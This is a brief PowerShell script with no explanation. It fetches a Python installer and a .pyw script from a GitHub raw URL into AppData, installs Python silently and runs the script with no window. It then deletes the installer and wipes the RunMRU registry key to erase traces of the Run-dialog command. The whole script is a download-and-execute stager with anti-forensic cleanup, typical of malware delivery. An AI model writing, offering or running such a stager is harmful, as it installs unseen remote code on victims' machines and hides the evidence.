iwr "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe" -OutFile "$env:localappdata\installation"
iwr "https://raw.githubusercontent.com/0x7030676e31/0x7030676e31/main/script.pyw" -OutFile "$env:localappdata\script.pyw"

Start-Process -Wait -FilePath "$env:localappdata\installation" -ArgumentList "/quiet InstallAllUsers=0 InstallLauncherAllUsers=0 PrependPath=1 Include_test=0 Include_pip=0 Include_tcltk=0"
Start-Process -FilePath "$env:localappdata\Programs\Python\Launcher\pyw.exe" -WorkingDirectory $env:localappdata -ArgumentList "-3.11 $env:localappdata\script.pyw"

Remove-Item -Path "$env:localappdata\installation"
$MRU = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
if (Test-Path -Path $MRU) {
   Remove-Item -Path $MRU -Recurse
}
